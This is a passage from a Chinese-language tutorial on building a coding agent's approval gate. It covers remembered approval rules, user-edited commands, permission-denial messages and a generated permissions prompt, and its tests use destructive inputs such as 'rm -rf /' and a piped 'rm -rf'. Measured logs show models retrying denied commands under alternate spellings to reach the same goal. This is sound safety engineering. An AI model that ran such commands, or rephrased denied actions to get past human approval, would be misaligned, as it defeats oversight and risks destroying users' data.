>   另一段没有。用 `any` 就会自动执行第二段。`any` 和 `all` 差一个词，差的就是 §3 那个洞。
>   `bool(segments) and ...`：空列表时直接返回 `False`，因为 `all([])` 是 `True`。
> - `remember`：先 `check_rule`，再存；项目规则立刻写盘。
> - `forget(index)`：按 `minicodex rules` 打出来的编号撤销。docstring：**只能靠找到并手改 JSON 文件才能删掉的规则，就是一条永远留着的规则。**
> - `_save`：只把项目规则写进文件。

> **`_load`：磁盘上的规则也要重新检查。**
>
> - 文件读不了或不是合法 JSON，返回空列表——**坏掉的文件不能让 Agent 起不来，也不能悄悄放行任何东西**，
>   所以结果是"什么都没记住、每条都问"。
> - 每一条都重新过一遍 `check_rule`。文件谁都能改，"它已经在文件里了"不是承认 `["python3"]` 的理由。
>   单条不合格就跳过那一条（`continue`），其余照常加载——跳过只会让放行变少，不会变多。
> - `item.get("prompted_by", "(unrecorded)")`：字典的 `get` 带默认值，缺字段也不报错。

### 14.2 建议记住什么

问人的时候，要提议记住哪条前缀？回到 `approval.py`：

```python
def _looks_like_a_subcommand(word: str) -> bool:
    """`test`, `pr`, `run` yes.  `-q`, `tests/test_patch.py`, `--all` no.

    The distinction matters in both directions.  Including a flag makes the
    rule so specific that `pytest -x` asks again, which rebuilds the fatigue
    the rule existed to remove.  Including a path makes it specific to one
    file, with the same result.
    """
    return bool(word) and not word.startswith("-") and "/" not in word and "." not in word


def _suggested_rule(command: str) -> tuple[str, ...] | None:
    """The prefix worth remembering, or None if none is.

    The program plus up to two subcommand-shaped words after it.  This is the
    shape of codex's own examples -- `["cargo", "test"]`, `["gh", "pr", "check"]`,
    `["npm", "run", "dev"]` -- and it lands between the two ways of getting this
    wrong: `("cargo",)` is every subcommand cargo will ever have, and
    `("cargo", "test", "--all-features")` will not match the next invocation.
    """
    parts = segments(command)
    if parts is None or len(parts) != 1:
        # A multi-segment command is a composition, and a rule made from its
        # first words would silently cover whatever the user pipes into it
        # next time.
        return None

    words = [parts[0][0]]
    for word in parts[0][1:3]:
        if not _looks_like_a_subcommand(word):
            break
        words.append(word)

    try:
        check_rule(tuple(words))
    except RuleRefused:
        return None
    return tuple(words)
```

> - 取程序名，加上**最多两个**"长得像子命令"的词：不以 `-` 开头、不含 `/` 和 `.`。
>   `cargo test --all-features` → `("cargo", "test")`；`pytest tests/test_patch.py` → `("pytest",)`。
>   这也是 codex 自己举的例子的形状：`["cargo", "test"]`、`["gh", "pr", "check"]`、`["npm", "run", "dev"]`。
> - 两个方向都会错：`("cargo",)` 太宽；`("cargo", "test", "--all-features")` 太窄，下次换个选项又要问。
>   **规则太窄和没有规则，最后导致同一个结果**——用户觉得"记住"没用，接着一路点"是"。
> - 多段命令不提议规则：用它前几个词做的规则，会悄悄覆盖下次管道后面接的任何东西。
> - 最后用 `check_rule` 过一遍：不该记的，就不提议。

### 14.3 看得见、撤得掉

`__main__.py` 加两个子命令，`rules` 列出所有记住的项目规则，`forget N` 撤销第 N 条（完整的 `__main__.py` 在 §17.4）：

```python
def _list_rules() -> int:
    """A rule nobody can see is a rule nobody can revoke."""
    store = RuleStore(Path(DEFAULT_RULES_PATH))
    if not len(store):
        print("no remembered approvals")
        return 0
    for index, rule in enumerate(store.all()):
        print(f"  {index}  {rule.describe()}")
    print(f"\nrevoke with: minicodex forget N   ({DEFAULT_RULES_PATH})")
    return 0


def _forget_rule(index: int) -> int:
    store = RuleStore(Path(DEFAULT_RULES_PATH))
    try:
        rule = store.forget(index)
    except IndexError:
        print(f"no rule numbered {index}; run `minicodex rules` to see them", file=sys.stderr)
        return 1
    print(f"revoked: {rule.describe()}")
    return 0
```

> - `_list_rules` 的 docstring 只有一句：**看不见的规则，就是撤不掉的规则。**
> - `enumerate(列表)`：同时拿到编号和元素。
> - `_forget_rule`：编号不存在时 `pop` 会抛 `IndexError`，接住它，告诉用户去哪里看编号，返回 1（失败的退出码）。

### 14.4 测试

```python
# ---------------------------------------------------------------------------
# F05-06  approval fatigue
# ---------------------------------------------------------------------------


async def test_F05_06_without_memory_the_same_command_asks_every_time() -> None:
    class Counting:
        def __init__(self) -> None:
            self.asked = 0

        async def ask(self, request: ApprovalRequest) -> ApprovalReply:
            self.asked += 1
            return ApprovalReply(True, request.what)

    approver = Counting()
    session = Session(mode="read-only", approver=approver)
    for _ in range(5):
        await gate_command("pytest -q", session)
    assert approver.asked == 5


async def test_F05_06_a_remembered_rule_stops_the_asking() -> None:
    class Counting:
        def __init__(self) -> None:
            self.asked = 0

        async def ask(self, request: ApprovalRequest) -> ApprovalReply:
            self.asked += 1
            return ApprovalReply(True, request.what, remember="session")

    approver = Counting()
    session = Session(mode="read-only", approver=approver)
    for _ in range(5):
        result = await gate_command("pytest -q", session)
        assert result.allowed
    assert approver.asked == 1, "asked once, then remembered"
    assert len(session.rules) == 1


async def test_F05_06_the_rule_covers_the_category_not_the_exact_string() -> None:
    """A rule that only matches the byte-identical command rebuilds the fatigue
    it was added to remove: `pytest -q` and `pytest -x` would each need a yes."""
    session = Session(mode="read-only", approver=AllowAll())
    session.rules.remember(("pytest",), scope="session", prompted_by="pytest -q")
    assert (await gate_command("pytest -x tests/", session)).allowed


async def test_F05_06_a_rule_covering_one_segment_does_not_cover_the_others() -> None:
    """`allows_every`, not `allows_any`."""
    session = Session(mode="read-only", approver=DenyAll())
    session.rules.remember(("pytest",), scope="session", prompted_by="pytest -q")
    result = await gate_command("pytest -q | rm -rf /", session)
    assert not result.allowed


# ---------------------------------------------------------------------------
# F05-07  a remembered rule is too broad and unattributable
# ---------------------------------------------------------------------------


def test_F05_07_a_rule_records_where_it_came_from() -> None:
    store = RuleStore()
    rule = store.remember(("cargo", "test"), scope="session", prompted_by="cargo test --all")
    assert rule.prompted_by == "cargo test --all"
    assert rule.created_at
    assert "cargo test" in rule.describe()
    assert "cargo test --all" in rule.describe()


def test_F05_07_a_rule_can_be_revoked() -> None:
    store = RuleStore()
    store.remember(("cargo", "test"), scope="session", prompted_by="cargo test")
    assert len(store) == 1
    store.forget(0)
    assert len(store) == 0


def test_F05_07_an_interpreter_rule_is_refused() -> None:
    """codex bans the same prefixes from the other side, in its prompt:
    not `["python3"]`, not `["python", "-"]`."""
    with pytest.raises(RuleRefused, match="every program"):
        check_rule(("python3", "-c"))


def test_F05_07_a_destructive_rule_is_refused() -> None:
    with pytest.raises(RuleRefused, match="arguments are where the damage lives"):
        check_rule(("rm", "-rf"))


def test_F05_07_a_bare_tool_name_rule_is_refused() -> None:
    """`["git"]` approves `git push --force`. `["cargo"]` approves `cargo publish`."""
    with pytest.raises(RuleRefused, match="every subcommand"):
        check_rule(("git",))
    check_rule(("git", "status"))  # naming the subcommand is fine
    check_rule(("ls",))  # a read-only command has no dangerous subcommands


def test_F05_07_project_rules_survive_and_are_re_checked_on_load(tmp_path: Path) -> None:
    path = tmp_path / "rules.json"
    RuleStore(path).remember(("cargo", "test"), scope="project", prompted_by="cargo test")
    assert len(RuleStore(path)) == 1

    # The file is editable by anyone who owns the machine. "It was already in
    # the file" is not a reason to honour a rule that would be refused today.
    path.write_text(
        json.dumps([{"words": ["python3"], "prompted_by": "hand-edited"}]), encoding="utf-8"
    )
    assert len(RuleStore(path)) == 0


def test_F05_07_a_corrupt_rules_file_grants_nothing(tmp_path: Path) -> None:
    path = tmp_path / "rules.json"
    path.write_text("{not json", encoding="utf-8")
    assert len(RuleStore(path)) == 0


async def test_F05_07_session_rules_do_not_reach_disk(tmp_path: Path) -> None:
    path = tmp_path / "rules.json"
    store = RuleStore(path)
    store.remember(("pytest",), scope="session", prompted_by="pytest -q")
    assert not path.exists()


```

> - **F05-06**：没有规则时，同一条命令问五次（`Counting` 是一个会数数的假 Approver）；有规则后只问一次；
>   规则覆盖的是一类命令而不是一模一样的字符串（`pytest -q` 的规则放行 `pytest -x tests/`）；
>   规则只覆盖一段时，整条命令不放行（`allows_every`）。
> - **F05-07**：规则记录来源；能撤销；解释器、会写的命令、单词的 `git` 规则都被拒绝（`pytest.raises(..., match=...)`：
>   断言会抛这个异常，并且消息里有这段文字）；项目规则写盘后能重新读出来，**手工写进文件的 `["python3"]` 读的时候被过滤掉**；
>   坏的 JSON 文件什么都不放行；会话规则不写盘。

```bash
git add src/minicodex/rules.py src/minicodex/approval.py src/minicodex/__main__.py tests/test_approval.py
git commit -m "feat: remember approvals, with a scope, a source and a way to revoke"
```

---

## §15 F05-08：用户改了命令

F05-08 说的是：**用户审批时改了命令，模型不知道，以为原来那条跑了。**

这条是 🟡 静默，而且静默得很彻底：工具返回了正常的输出，模型读了，然后基于"我发的那条命令的结果"继续推理。
**没有一个环节出错，除了模型对世界的理解。**

在终端里问人的是 `CliApprover`：

```python
class CliApprover:
    """Ask on the terminal.

    `input()` blocks, and a blocking call inside `async def` stalls the whole
    event loop -- the same rule chapter 1 hit with `Path.read_text()` and
    chapter 2 with `subprocess.Popen`.  Here it is arguably harmless, since
    there is nothing to do while a human decides, but ruff's ASYNC rules do not
    know that and neither will the next reader.  `to_thread` costs one line.
    """

    def __init__(self, *, stream_in=None, stream_out=None) -> None:
        self._in = stream_in
        self._out = stream_out

    async def ask(self, request: ApprovalRequest) -> ApprovalReply:
        return await asyncio.to_thread(self._ask_blocking, request)

    def _ask_blocking(self, request: ApprovalRequest) -> ApprovalReply:
        import sys

        out = self._out or sys.stdout
        read = self._in.readline if self._in is not None else sys.stdin.readline

        print(f"\n  the agent wants to run:\n    {request.what}", file=out)
        print(f"  {request.reason}", file=out)
        choices = ["[y] once", "[n] no", "[e] edit"]
        if request.suggested_rule is not None:
            prefix = " ".join(request.suggested_rule)
            choices[1:1] = [
                f"[s] always this session ({prefix})",
                f"[p] always in this project ({prefix})",
            ]
        print("  " + "  ".join(choices), file=out)
        out.flush()

        answer = (read() or "n").strip().lower()

        if answer == "e":
            print("  new command: ", file=out, end="")
            out.flush()
            edited = (read() or "").strip()
            # An empty edit is not an approval of the original.  Treating it as
            # one turns a slip of the return key into a yes.
            return ApprovalReply(bool(edited), edited or request.what)
        if answer == "s" and request.suggested_rule is not None:
            return ApprovalReply(True, request.what, remember="session")
        if answer == "p" and request.suggested_rule is not None:
            return ApprovalReply(True, request.what, remember="project")
        return ApprovalReply(answer == "y", request.what)
```

> - **为什么用 `asyncio.to_thread`**：`input()`/`readline()` 会卡住整个线程，在 `async def` 里直接调用会卡住整个事件循环——
>   第 1 章的 `Path.read_text()`、第 2 章的 `subprocess.Popen` 是同一条规则。这里卡住其实问题不大（人在想的时候本来也没别的事做），
>   但 ruff 的 ASYNC 规则不知道这一点，下一个读代码的人也不知道。`to_thread` 只要一行。
> - `stream_in`/`stream_out`：测试时可以传进 `io.StringIO`（一个"假装是文件"的字符串），不用真的敲键盘。
> - 选项：`[y]` 一次、`[n]` 不、`[e]` 改；只有能提议规则时，才加上 `[s]` 本次会话都允许、`[p]` 这个项目都允许。
>   `choices[1:1] = [...]`：在下标 1 的位置插入一串元素。
> - **`(read() or "n")`**：`readline()` 在输入已经结束时返回空字符串 `""`，`"" or "n"` 得到 `"n"`。
> - 最后一行 `answer == "y"`：**只有明确的 `y` 才是同意**。

界面长这样：

```
  the agent wants to run:
    pytest
  'pytest' is not on any list, so what it does is unknown, which read-only does not permit
  [y] once  [s] always this session (pytest)  [p] always in this project (pytest)  [n] no  [e] edit
```

选 `[e]` 改完之后，`gate_command` 执行的是改过的命令，并在 `note` 里写清楚（§12.3 那段代码的最后几行）：

```
Note: the user changed your command before running it. You asked for: 'pytest'. What actually ran: 'pytest tests/test_patch.py'. The output below is from the command that ran.
```

`run_shell` 把它贴在输出前面（§12.4）。

### 15.1 三个容易写错的细节

**一，空的编辑不是同意。** `return ApprovalReply(bool(edited), edited or request.what)`：改成空的，`bool("")` 是 `False`。
否则手一滑按了回车，就变成了"是"。

**二，输入关掉时必须是"不"。** `readline()` 在输入结束时返回 `""`。我们写的是 `answer == "y"`，所以碰巧是对的。
如果写成 `answer != "n"`——**在终端里一切正常，在 CI（没有键盘输入）里全部放行**，而 CI 恰恰是最不该放行的地方。

**三，记住的是人同意的那条，不是模型要的那条。** `gate_command` 里：`remembered = _suggested_rule(reply.command)`，
用的是 `reply.command`。模型要 `cargo publish`，人改成 `cargo test` 并选"永远允许"——记下来的必须是 `("cargo", "test")`。
写反了，就是用一次拒绝换来了一条永久的同意。

### 15.2 一个自己打自己脸的测试

`test_F05_08_the_note_reaches_the_tool_output` 第一版用的命令是 `echo original`，断言输出里有"the user changed your command"。
它红了：`echo` 在只读名单上，**根本走不到问人那一步**，也就不可能被改。测试选的场景，不可能触发它要测的东西。
改成 `rm -rf everything`，测试里留了一段注释说明这件事。

### 15.3 测试

```python
# ---------------------------------------------------------------------------
# F05-08  the user edits the command and the model is never told
# ---------------------------------------------------------------------------


async def test_F05_08_an_edited_command_is_the_one_that_runs() -> None:
    class Editing:
        async def ask(self, request: ApprovalRequest) -> ApprovalReply:
            return ApprovalReply(True, "pytest tests/test_patch.py")

    result = await gate_command("pytest", Session(approver=Editing()))
    assert result.allowed
    assert result.command == "pytest tests/test_patch.py"


async def test_F05_08_the_model_is_told_the_command_changed() -> None:
    """Without this the model reads the output as the result of what it asked
    for, and reports on a command that never ran."""

    class Editing:
        async def ask(self, request: ApprovalRequest) -> ApprovalReply:
            return ApprovalReply(True, "pytest tests/test_patch.py")

    result = await gate_command("pytest", Session(approver=Editing()))
    assert result.note is not None
    assert "pytest tests/test_patch.py" in result.note
    assert "'pytest'" in result.note


async def test_F05_08_the_note_reaches_the_tool_output(tmp_path: Path) -> None:
    class Editing:
        async def ask(self, request: ApprovalRequest) -> ApprovalReply:
            return ApprovalReply(True, "echo edited")

    ctx = ToolContext(
        root=tmp_path,
        shell=ShellSession(),
        session=Session(approver=Editing()),
    )
    # `rm`, not `echo`: a command that is already allowed never reaches the
    # approver, so it can never be edited. The first version of this test used
    # `echo` and passed a note-free output straight through.
    out = await run_shell(ctx, {"command": "rm -rf everything"})
    assert "the user changed your command" in out
    assert "edited" in out


async def test_F05_08_a_remembered_rule_is_built_from_what_was_agreed() -> None:
    """Editing the command and choosing "always" otherwise remembers the
    version that was just rejected."""

    class EditingAndRemembering:
        async def ask(self, request: ApprovalRequest) -> ApprovalReply:
            return ApprovalReply(True, "cargo test", remember="session")

    session = Session(approver=EditingAndRemembering())
    await gate_command("cargo publish", session)
    assert [rule.words for rule in session.rules.all()] == [("cargo", "test")]


def test_F05_08_an_empty_edit_is_not_an_approval() -> None:
    """A slip of the return key must not become a yes."""
    import io

    approver = CliApprover(stream_in=io.StringIO("e\n\n"), stream_out=io.StringIO())
    reply = approver._ask_blocking(
        ApprovalRequest(what="rm -rf /", reason="", risk=Risk.WRITE, suggested_rule=None)
    )
    assert not reply.approved


def test_F05_08_a_closed_stdin_is_a_no() -> None:
    """`readline()` on an exhausted stream returns `''`. Falling through to
    "approved" there would make a piped, non-interactive run approve
    everything -- silently, and only in production."""
    import io

    approver = CliApprover(stream_in=io.StringIO(""), stream_out=io.StringIO())
    reply = approver._ask_blocking(
        ApprovalRequest(what="rm -rf /", reason="", risk=Risk.WRITE, suggested_rule=None)
    )
    assert not reply.approved


def test_F05_08_the_prompt_offers_a_rule_only_when_one_could_be_made() -> None:
    """Offering "always" and then refusing it teaches people to ignore refusals."""
    import io

    out = io.StringIO()
    CliApprover(stream_in=io.StringIO("n\n"), stream_out=out)._ask_blocking(
        ApprovalRequest(what="rm -rf x", reason="", risk=Risk.WRITE, suggested_rule=None)
    )
    assert "always" not in out.getvalue()

    out = io.StringIO()
    CliApprover(stream_in=io.StringIO("n\n"), stream_out=out)._ask_blocking(
        ApprovalRequest(
            what="cargo test", reason="", risk=Risk.UNKNOWN, suggested_rule=("cargo", "test")
        )
    )
    assert "always" in out.getvalue()


```

> - 前两个：执行的是改过的命令；`note` 里同时有原命令和新命令。
> - 第三个：`note` 真的到了工具输出里（§15.2）。
> - 第四个：记住的规则来自人同意的命令（§15.1 第三条）。
> - 后三个直接调用 `CliApprover._ask_blocking`（跳过 `to_thread`）：`"e\n\n"` 表示"按 e，然后输入一个空行"——不是同意；
>   空输入——不是同意；不能提议规则时，界面上不出现"always"。

```bash
git add src/minicodex/approval.py tests/test_approval.py
git commit -m "feat: an edited command is the one that runs, and the model is told"
```

---

## §16 F05-09：权限拒绝不是普通错误

从这里开始的三条（F05-09、F05-10、F05-11）都是 🔵：**只有让真模型跑起来才会出现**。

F05-09 说的是：**被权限拒绝后，模型当成普通错误，反复重试。**

第 3 章测出过：一条只说"哪里错了"的错误消息，gemma4 会原样重发；换成三段式（出了什么错 / 你发了什么 / 下一步做什么），它就能恢复。
那这里照做就行？把拒绝写成三段式，再加一句"重试没用"？**先测，再下结论。**

### 16.1 第一版的指标是错的

场景 A：给模型一个要写文件的任务，所有 shell 命令都拒绝，看它接下来发什么。两种措辞：光秃秃的 `Error: operation not permitted`，和三段式。

第一版数的是"原样重复的命令有几条"。结果：**两种措辞都是 0。** 读到这里的结论会是"模型不重试，这条故障不存在"。

看一眼模型实际发了什么（gemma4，原始记录）：

```
pytest  ->  python3 -m pytest  ->  /usr/bin/pytest  ->  /usr/bin/python3 -m pytest
```

四次拒绝，零次原样重复，**一个意图**。

> **它不是在重发同一个字符串，而是在换着法子拼写同一件事。**
> 模型把权限拒绝理解成了"命令写错了"，于是去找 pytest 的其他路径——这正是 F05-09 说的行为，只是长得和预想的不一样。
>
> **一个只能抓住"完全相同的字符串"的指标，看不见一个正在绕着墙走的模型。**

于是加了第二个指标："同目标重试"：被拒绝的命令里，和前面某条被拒绝的命令共用一个有意义的词（去掉选项之后）。粗糙，但能抓住上面那一族。

### 16.2 重新测

原始记录：

```
gemma4:31b-cloud
  bare 'Error:'
    1: 4 refused, 0 verbatim repeats, 2 same-goal retries
    2: 4 refused, 0 verbatim repeats, 2 same-goal retries
    3: 4 refused, 0 verbatim repeats, 2 same-goal retries
  three-part
    1: 4 refused, 0 verbatim repeats, 2 same-goal retries
    2: 4 refused, 0 verbatim repeats, 2 same-goal retries
    3: 4 refused, 0 verbatim repeats, 2 same-goal retries

gpt-4o-mini
  bare 'Error:'
    1: 5 refused, 2 verbatim repeats, 3 same-goal retries
    2: 4 refused, 0 verbatim repeats, 3 same-goal retries
    3: 4 refused, 2 verbatim repeats, 2 same-goal retries
  three-part
    1: 3 refused, 0 verbatim repeats, 1 same-goal retries
    2: 5 refused, 1 verbatim repeats, 2 same-goal retries
    3: 3 refused, 0 verbatim repeats, 1 same-goal retries
```

**12 次里 12 次都在重试同一个目标。两个模型，两种措辞，一次不落。**

结论分两半，都要如实写：

- **F05-09 成立，而且很稳定。**
- **只改措辞修不好它。** 三段式在 gemma4 上没有任何改善；在 gpt-4o-mini 上有减少（同目标重试从 3/3/2 降到 1/2/1），但**没有一次真正停下来**。

> **这和第 3 章的结论不矛盾，合起来才完整。**
> 第 3 章的三段式修好的是"模型不知道往哪个方向改"——它缺的是**信息**。
> 这里模型不缺信息，它缺的是**别的可以做的事**。
>
> "下一步做什么"那一段，只有在真的存在一个可做的下一步时才有用。

拒绝消息里写的下一步是"调用 request_permissions"——而场景 A 的工具列表里**根本没有这个工具**。所以这一节真正的结论是：
**这条路走不通，看 §18。**

### 16.3 那为什么还要区分

`tool_errors.py` 加一个 `permission_error`，全部内容：

```python
"""How a tool tells the model that something went wrong.

Measured, not preferred. Chapter 3 sent the same failed call back to two
models with two different error messages:

    bare:       "ValueError: invalid path"
    three-part: "Error: path must be relative to the repository root, not
                 absolute. You sent: /home/dev/... Send this instead: src/..."

gemma4:31b, given the bare one, sent an absolute path again three times out
of three -- it was trying to fix it (it dropped two directory levels) but had
no way to know which direction was wrong. Given the three-part one, it
recovered three times out of three.

gpt-4o-mini recovered from both. That is the trap: test the wording against
the stronger model only and every wording looks fine.

So the parts are not a style guide. They are the difference between a loop
that recovers on the next turn and one that spends its whole turn budget
resending the same call. `do_this` is a required keyword argument for that
reason -- an error message that does not say what to do next is the one that
measurably does not work.

This module imports nothing of ours. `tools.py` and `shell.py` both need it,
and `tools.py` already imports `shell.py`; putting it in either would build
the circular import that chapter 1 broke with `agent_types.py`. Same shape,
same answer, second time -- move the shared thing down to a leaf.
"""

from __future__ import annotations

ERROR_PREFIX = "Error:"
PERMISSION_PREFIX = "Permission denied:"


def _three_part(prefix: str, problem: str, you_sent: str | None, do_this: str) -> str:
    parts = [f"{prefix} {problem}"]
    if you_sent is not None:
        shown = you_sent if len(you_sent) <= 200 else you_sent[:200] + "..."
        parts.append(f"You sent: {shown}")
    parts.append(do_this)
    return " ".join(parts)


def tool_error(problem: str, *, you_sent: str | None = None, do_this: str) -> str:
    """Build the three-part message: what went wrong, what was received, what
    to do next.

    `you_sent` is optional because some failures have no input worth quoting
    back (a missing argument, say). `do_this` is not optional.
    """
    return _three_part(ERROR_PREFIX, problem, you_sent, do_this)


def permission_error(problem: str, *, you_sent: str | None = None, do_this: str) -> str:
    """The same three parts, under a prefix that means something different.

    Chapter 5 added this because the two kinds of failure need opposite
    responses and, written the same way, the model cannot tell them apart.

    An ordinary error is about the command: the path was wrong, the test
    failed, the argument was missing. The right response is to try something
    else, and retrying a *changed* version is exactly right.

    A permission decision is not about the command at all. It is about what
    this session is allowed to do, and it will not change because the model
    tried harder. Retrying is guaranteed to fail, and a model that treats it as
    an ordinary error spends its turn budget asking for the same thing in
    different spellings.

    Two things carry the distinction: a prefix that is not the word "Error",
    and a `do_this` that says the retry will fail and names the one action that
    can change the answer. The wording alone was measured and did not stop the
    retrying -- a `request_permissions` tool did; the prefix mostly helps a
    human reading the transcript tell the two failures apart.
    """
    return _three_part(PERMISSION_PREFIX, problem, you_sent, do_this)
```

> - 两个前缀做成常量 `ERROR_PREFIX`、`PERMISSION_PREFIX`，测试和提示词都引用它们，不重复手写。
> - 原来 `tool_error` 的函数体抽成 `_three_part(prefix, ...)`，两个函数共用：三段式的结构一样，只是开头的词不同。
>   函数名前的下划线表示"模块内部用"。
> - **`permission_error` 的 docstring** 讲清楚了两种失败为什么需要相反的反应：普通错误是关于**命令**的，换个写法再试正是对的；
>   权限决定是关于**这次会话能做什么**的，模型再努力它也不会变。最后一句如实说了测量结果：**光靠措辞没能止住重试，
>   `request_permissions` 工具止住了；这个前缀的主要价值是让读记录的人一眼分清两种失败。**

所以保留这个区分，但**不把它记成一次修复**。它的价值是可观测性（🟠），不是改变了模型行为。

拒绝消息本身由 `approval.py` 的 `_denial` 拼出来：

```python
def _denial(what: str, reason: str, session: Session) -> str:
    """The message the model gets when the answer is no.

    The last sentence depends on the policy, and that dependency was measured
    rather than designed.  The first version always ended "or call
    request_permissions".  Under `never` there is nobody to grant anything, and
    gpt-4o-mini responded to the sentence by sending

        run_shell({"command": "request_permissions"})

    -- trying to run the tool as a shell command, because the message named it
    and nothing said where it lived.  Naming a capability is an instruction to
    use it, so it is only named when using it can work.  The same mistake in
    the same chapter, found the same way: see `permissions_block`.
    """
    if session.policy == "never":
        do_this = (
            "This is a permissions decision, not a failure of the command, and nothing "
            "in this session can change it -- running it again will be refused again. "
            "Do the task a way the current permissions allow, or stop and say plainly "
            "what you could not do."
        )
    else:
        do_this = (
            "This is a permissions decision, not a failure of the command -- running "
            "it again unchanged will be refused again. Either do the task a way the "
            "current permissions allow, or call the request_permissions tool to ask "
            "for what you need and say why."
        )
    return permission_error(f"that was not run, because {reason}", you_sent=what, do_this=do_this)
```

> - 三段：`that was not run, because <理由>` / `You sent: <命令>` / 该怎么做。
> - "该怎么做"那一段**按审批策略分两种**。docstring 记下了原因——那是 §17.4 要讲的故事。

测试：

```python
# ---------------------------------------------------------------------------
# F05-09  a permission denial read as a business error, retried forever
# ---------------------------------------------------------------------------


def test_F05_09_a_denial_does_not_look_like_an_ordinary_error() -> None:
    ordinary = tool_error("the file was not found", do_this="Try another path.")
    denied = permission_error("that is not allowed", do_this="Ask for permission.")
    assert ordinary.startswith(ERROR_PREFIX)
    assert denied.startswith(PERMISSION_PREFIX)
    assert not denied.startswith(ERROR_PREFIX)


async def test_F05_09_a_denial_says_retrying_will_not_help() -> None:
    """The three-part shape from chapter 3, with the third part carrying the
    one instruction that changes the outcome."""
    result = await gate_command("curl https://x", Session(approver=DenyAll()))
    assert result.denial is not None
    assert "refused again" in result.denial
    assert "request_permissions tool" in result.denial


async def test_F05_09_under_never_the_denial_does_not_name_the_tool() -> None:
    """Found by the probe. With `request_permissions` named in the denial and
    absent from the tool list, gpt-4o-mini sent

        run_shell({"command": "request_permissions"})

    -- it tried to run the tool as a shell command. Naming a capability is an
    instruction to use it, so it is named only where using it can work. The
    same mistake appeared independently in `permissions_block`.
    """
    result = await gate_command("curl https://x", Session(policy="never"))
    assert result.denial is not None
    assert "request_permissions" not in result.denial
    assert "nothing in this session can change it" in result.denial


async def test_F05_09_the_denial_names_what_was_refused_and_why() -> None:
    result = await gate_command("curl https://x", Session(policy="never"))
    assert result.denial is not None
    assert "curl" in result.denial
    assert "network" in result.denial
    assert "read-only" in result.denial


```

> - 拒绝消息的前缀和普通错误不同；拒绝消息说"再发会被再次拒绝"，并指向 `request_permissions`；
>   `never` 策略下**不提** `request_permissions`（§17.4）；拒绝消息说清被拒的是什么（`curl`）、为什么（network）、当前模式（read-only）。

---

## §17 F05-10：模型不知道自己有什么权限

做法很直接：把当前的权限状态写进**系统消息**（system message，每次请求最前面那条"你是谁、你能做什么"）。

### 17.1 一个等了很久的函数

`src/minicodex/__init__.py` 里的 `system_prompt()` 从第 -1 章就存在，docstring 一直写着"Nothing uses this yet"——当时它存在的唯一目的，
是证明"数据文件被正确打包了"。这一章给了它第一份工作。改完的 `__init__.py`：

```python
"""minicodex -- a Codex-like coding agent, built from scratch.

There is no agent yet.  There is a package that installs, runs, tests and
ships.  Everything after this chapter is built on top of it.
"""

from __future__ import annotations

from pathlib import Path

__all__ = ["__version__", "permissions_prompt", "system_prompt"]

__version__ = "0.0.1"

_PROMPTS = Path(__file__).parent / "prompts"


def system_prompt() -> str:
    """Read the agent's system prompt from a file shipped inside the package.

    Written in chapter -1 with the note "nothing uses this yet" -- it existed
    because a data file is the cheapest way to prove that packaging works: code
    that only imports .py files will pass every test even when the wheel is
    broken.  Chapter 5 gives it a job, because the permission state has to
    reach the model somehow and a system message is where it goes.
    """
    return (_PROMPTS / "system.md").read_text(encoding="utf-8")


def permissions_prompt() -> str:
    """The template for the block that says what the agent may currently do."""
    return (_PROMPTS / "permissions.md").read_text(encoding="utf-8")
```

> - `system_prompt()` 的 docstring 更新为"第 -1 章写的，这一章给了它用途"。
> - 新函数 `permissions_prompt()`：读 `prompts/permissions.md`，一个模板。`__all__` 里加上它的名字。

新建 `src/minicodex/prompts/permissions.md`：

```markdown
# What you are allowed to do right now

Filesystem sandboxing decides which files you can read or change.
`sandbox_mode` is `{mode}`: {mode_meaning}

Approvals decide what happens to everything the sandbox does not already
allow. `approval_policy` is `{policy}`: {policy_meaning}

A refusal from this layer starts with `Permission denied:`, not with `Error:`.
It is not a failure of your command and it will not change if you send the same
command again. {what_to_do}
```

> `{mode}`、`{mode_meaning}` 这些是占位符，由 Python 的 `str.format(...)` 填进去。

### 17.2 生成，不是抄写

```python
# -- telling the model ------------------------------------------------------

_MODE_MEANING: dict[SandboxMode, str] = {
    "read-only": (
        "you can read files and run commands that only read. Editing files and "
        "running commands that change anything both need approval."
    ),
    "workspace-write": (
        "you can read files and edit files inside this repository with "
        "`apply_patch`. A *shell command* that changes anything still needs "
        "approval, because a shell command's paths cannot be checked in advance."
    ),
    "full-access": "nothing is restricted. Be careful; nobody is checking after you.",
}

_POLICY_MEANING: dict[ApprovalPolicy, str] = {
    # Does not name `request_permissions`, even to say it will not work: under
    # `never` the tool is still in the schema, and a sentence containing the
    # name is a sentence that can be read as an instruction to use it.
    "never": "there is nobody to ask. Anything the sandbox does not already allow is refused.",
    "on-request": "a human is here and will be asked about anything the sandbox does not allow.",
    "unless-trusted": (
        "a human is here and will be asked about everything except commands that only read."
    ),
}


def permissions_block(session: Session, *, can_request: bool = True) -> str:
    """Render the current permission state for the system prompt.

    Generated from the same constants the gate uses, never typed out twice.
    Chapter 3 found a defaulted number copied into a description and going
    stale; a permission state typed into a prompt by hand would drift from the
    gate the first time either one changed.  (It is still rendered once per
    run -- see `_instructions` in `__main__`.)

    `can_request` exists because the probe caught this block lying.  The first
    version ended "or call `request_permissions`" unconditionally.  Run against
    a real model with that tool deliberately absent, gemma4 called it anyway,
    2 samples out of 3 -- and in the real agent that lands on chapter 0's
    "no tool named 'request_permissions'" error, which is the message written
    for a model that *invented* a name.  It did not invent it; the prompt told
    it to.  A prompt that names a tool the model does not have is a prompt that
    spends a turn of the budget teaching it a lie.
    """
    from minicodex import permissions_prompt

    if session.policy == "never":
        what_to_do = (
            "Nothing can change that in this session, so do not ask. Work within "
            "the current permissions and say plainly what you could not do."
        )
    elif can_request:
        what_to_do = (
            "When you see one, either do the task another way, or call "
            "`request_permissions` with what you need and why."
        )
    else:
        what_to_do = "When you see one, do the task another way, or stop and explain."

    return permissions_prompt().format(
        mode=session.mode,
        mode_meaning=_MODE_MEANING[session.mode],
        policy=session.policy,
        policy_meaning=_POLICY_MEANING[session.policy],
        what_to_do=what_to_do,
    )
```

> - `_MODE_MEANING`、`_POLICY_MEANING`：每种模式、每种策略对模型说的一句人话。注意 `workspace-write` 那句**如实说了 §11.2 的缺口**：
>   能用 `apply_patch` 改仓库里的文件，但会改东西的 shell 命令仍然要问。
> - **`permissions_block`：从 `Session` 当前的状态渲染，而不是手写一段文字。** 第 3 章发现过，手抄进描述里的默认值会过期；
>   手写进提示词的权限状态也一样，模式或提示词只要改动一处，两边就对不上了。
> - `from minicodex import permissions_prompt` 写在函数里面：`minicodex/__init__.py` 在包加载时就会执行，
